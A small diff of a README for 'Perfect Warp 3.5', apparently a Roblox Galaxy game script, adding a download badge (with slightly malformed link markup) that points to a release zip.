@@ -3,6 +3,8 @@ With Yname's blessing, I now present, Perfect Warp 3.5. The legal version of Per
 
 Perfect Auto Warp Scripts do exist, however I have chosen not to release them because Yname said he would be unhappy.
 
+[![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download Here")]([https://github.com/ic3w0lf22/Roblox-Account-Manager/releases/download/3.6.1/Roblox.Account.Manager.3.6.1.zip](https://github.com/ORB-Aerospace911/Roblox-Galaxy-Perfect-Warp/releases/download/v3.5/Perfect.Warp.3.5.zip))
+or
 [Download Here](https://github.com/ORB-Aerospace911/Roblox-Galaxy-Perfect-Warp/releases)
 
 ### NOTICE 
